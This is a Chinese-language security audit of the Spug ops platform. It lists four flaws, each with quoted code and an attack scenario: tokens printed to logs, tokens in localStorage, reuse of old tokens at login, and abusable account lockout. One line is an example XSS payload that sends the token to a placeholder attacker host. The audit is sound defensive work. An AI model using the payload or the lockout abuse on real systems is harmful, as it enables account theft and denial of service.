## 漏洞 #3：认证中间件print()输出Token到stdout（P0）

### 风险描述
认证中间件中使用 `print()` 将用户Token、认证状态等敏感信息输出到标准输出。在Docker/生产环境中，stdout会被日志收集系统捕获，导致Token泄露。

### 涉及文件

**文件：`spug_api/libs/middleware.py` 第35-56行**
```python
access_token = request.headers.get('x-token') or request.GET.get('x-token')
print(f'[AUTH] Request path: {request.path}, token: {access_token}')
if access_token and len(access_token) == 32:
    x_real_ip = get_request_real_ip(request.headers)
    user = User.objects.filter(access_token=access_token).first()
    print(f'[AUTH] User found: {user}, is_active: {user.is_active if user else None}')
    if user and user.token_expired >= time.time() and user.is_active:
        print(f'[AUTH] Token valid, IP check: x_real_ip={x_real_ip}, user.last_ip={user.last_ip}')
        # ...
        if x_real_ip == user.last_ip or ...:
            print(f'[AUTH] Setting request.user, is_supper: {user.is_supper}')
            # ...
        else:
            print(f'[AUTH] IP mismatch')
    else:
        print(f'[AUTH] Token invalid: token_expired={user.token_expired if user else None}, current_time={time.time()}')
print(f'[AUTH] Authentication failed')
```

### 攻击场景
1. 攻击者获取服务器日志访问权限（日志文件、日志收集系统、容器日志）
2. 从日志中提取有效的access_token
3. 使用token冒充任意用户发起请求

### 影响范围
- 所有已认证用户的Token均会泄露
- 攻击者可冒充任意用户（包括管理员）

## 漏洞 #9：Token存储在localStorage（P1）

### 风险描述
前端将认证Token存储在 `localStorage` 中。localStorage可被同源的任何JavaScript代码访问，一旦存在XSS漏洞，攻击者可直接窃取Token。

### 涉及文件

**文件1：`spug_web/src/libs/functools.js` 第17-24行**
```javascript
export function updatePermissions() {
  X_TOKEN = localStorage.getItem('token');
  Permission.isReady = true;
  Permission.isSuper = localStorage.getItem('is_supper') === 'true';
  try {
    Permission.permissions = JSON.parse(localStorage.getItem('permissions') || '[]');
  } catch (e) {
  }
}
```

**文件2：`spug_web/src/pages/login/index.js` 第63-69行**
```javascript
function doLogin(data) {
  localStorage.setItem('id', data['id']);
  localStorage.setItem('token', data['access_token']);
  localStorage.setItem('nickname', data['nickname']);
  localStorage.setItem('is_supper', data['is_supper']);
  localStorage.setItem('tenant_id', data['tenant_id'] || '');
  localStorage.setItem('permissions', JSON.stringify(data['permissions']));
  localStorage.setItem('login_type', loginType);
  updatePermissions();
}
```

### 攻击场景
1. 系统存在XSS漏洞（如用户输入未转义）
2. 攻击者注入恶意JS：`fetch('https://evil.com/?t='+localStorage.getItem('token'))`
3. 获取Token后可在任意设备冒充用户

### 与HttpOnly Cookie对比
| 存储方式 | XSS可读 | CSRF风险 | 跨标签页 |
|----------|---------|----------|----------|
| localStorage | ✅ 可读 | ❌ 无 | ✅ 共享 |
| sessionStorage | ✅ 可读 | ❌ 无 | ❌ 隔离 |
| HttpOnly Cookie | ❌ 不可读 | ✅ 有 | ✅ 共享 |

## 漏洞 #10：会话固定攻击 - 登录时复用旧Token（P1）

### 风险描述
登录成功后，如果旧Token未过期则直接复用，不生成新Token。这使得攻击者如果获取了用户的旧Token，即使用户重新登录也无法使旧Token失效。

### 涉及文件

**文件：`spug_api/apps/account/views.py` 第340-341行**
```python
token_isvalid = user.access_token and len(user.access_token) == 32 and user.token_expired >= time.time()
user.access_token = user.access_token if token_isvalid else uuid.uuid4().hex
```

### 攻击场景
1. 攻击者通过某种方式获取用户Token（日志泄露、网络嗅探）
2. 用户发现异常后重新登录
3. 由于Token被复用，攻击者的Token仍然有效
4. 用户无法通过重新登录来"踢掉"攻击者

## 漏洞 #20：登录失败锁定策略过于简单（P3）

### 风险描述
当前登录失败3次即永久禁用账户（设置`is_active=False`），这个策略存在两个问题：
1. 攻击者可恶意锁定任意已知用户名的账户（DoS攻击）
2. 被锁定后需要管理员手动恢复，影响正常使用

### 涉及文件

**文件：`spug_api/apps/account/views.py` 第307-314行**
```python
value = cache.get_or_set(form.username, 0, 86400)
if value >= 3:
    if user and user.is_active:
        user.is_active = False
        user.save()
    return handle_response(error='账户已被系统禁用')
cache.set(form.username, value + 1, 86400)
return handle_response(error="用户名或密码错误，连续多次错误账户将会被禁用")
```

### 攻击场景
1. 攻击者知道目标用户名（如admin）
2. 故意输错密码3次
3. 目标账户被永久禁用，合法用户无法登录
4. 需要管理员介入恢复（如果管理员账户也被锁定则系统瘫痪）
